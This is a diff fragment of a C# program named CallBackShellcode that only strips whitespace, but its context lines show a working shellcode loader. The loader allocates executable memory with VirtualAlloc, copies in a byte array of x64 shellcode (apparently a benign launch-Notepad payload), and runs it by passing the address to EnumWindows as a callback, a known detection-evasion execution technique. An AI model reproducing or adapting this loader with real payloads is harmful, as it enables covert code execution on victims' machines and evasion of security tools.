@@ -6,7 +6,7 @@ namespace CallBackShellcode
     class Program
     {
         static void Main()
-        { 
+        {
             // Notepad x64
             byte[] shellcode64 = new byte[276] {
 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
@@ -34,7 +34,7 @@ namespace CallBackShellcode
             IntPtr funcAddr = VirtualAlloc(BaseAddress, (uint)shellcode64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             // Copy shellcode
             Marshal.Copy(shellcode64, 0, funcAddr, shellcode64.Length);
-            
+
             // Execution via EnumWindows
             EnumWindows(funcAddr,IntPtr.Zero);
 
